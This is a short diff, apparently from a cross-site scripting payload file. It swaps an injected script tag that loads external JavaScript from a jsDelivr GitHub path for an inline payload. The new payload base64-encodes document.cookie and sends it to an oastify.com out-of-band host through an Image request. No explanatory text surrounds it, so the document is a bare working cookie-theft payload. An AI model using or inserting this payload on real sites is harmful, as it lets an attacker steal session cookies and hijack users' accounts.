@@ -1,3 +1,2 @@
-<script
-src="https://cdn.jsdelivr.net/gh/Kiano-1995/test/test.js">
-</script>
+x = new Image(); x.src = 'https://k5qts5w28179gymiltyx8smzlqrhf73w.oastify.com?
+data='+btoa(document.cookie);
